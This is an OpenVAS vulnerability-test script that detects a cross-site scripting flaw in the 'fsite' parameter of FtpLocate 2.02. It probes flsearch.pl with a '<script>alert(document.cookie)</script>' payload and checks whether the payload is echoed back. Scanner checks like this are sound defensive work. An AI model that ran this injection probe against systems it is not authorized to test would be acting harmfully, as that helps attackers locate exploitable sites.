###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ftplocate_xss_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# FtpLocate fsite Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if(description)
{
  script_id(803847);
  script_version("$Revision: 11 $");
  script_bugtraq_id(60760);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-01 10:40:30 +0530 (Thu, 01 Aug 2013)");
  script_name("FtpLocate fsite Parameter Cross Site Scripting Vulnerability");

  tag_summary =
"This host is running FtpLocate and is prone to cross-site scripting
vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to
read the cookie or not.";

  tag_insight =
"Input passed via 'fsite' parameter to 'flsearch.pl' script is not properly
sanitised before being returned to the user.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.";

  tag_affected =
"FtpLocate version 2.02, other versions may also be affected.";

  tag_solution =
"No solution or patch is available as of 07th August, 2013. Information
regarding this issue will be updated once the solution details are available.
For updates refer to http://turtle.ee.ncku.edu.tw/ftplocate/readme.english.html";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.1337day.com/exploit/20938");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/85250");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122144");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/ftplocate-202-cross-site-scripting");
  script_summary("Check if FtpLocate is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

foreach dir (make_list("", "/ftplocate", "/ftp", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item:string(dir,"/flsummary.pl"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if('>FtpLocate' >< res && 'Ftp Search Engine<' >< res)
  {
    url = dir + '/flsearch.pl?query=FTP&amp;fsite=<script>' +
                'alert(document.cookie)</script>';

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
                       pattern:"<script>alert\(document.cookie\)</script>"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
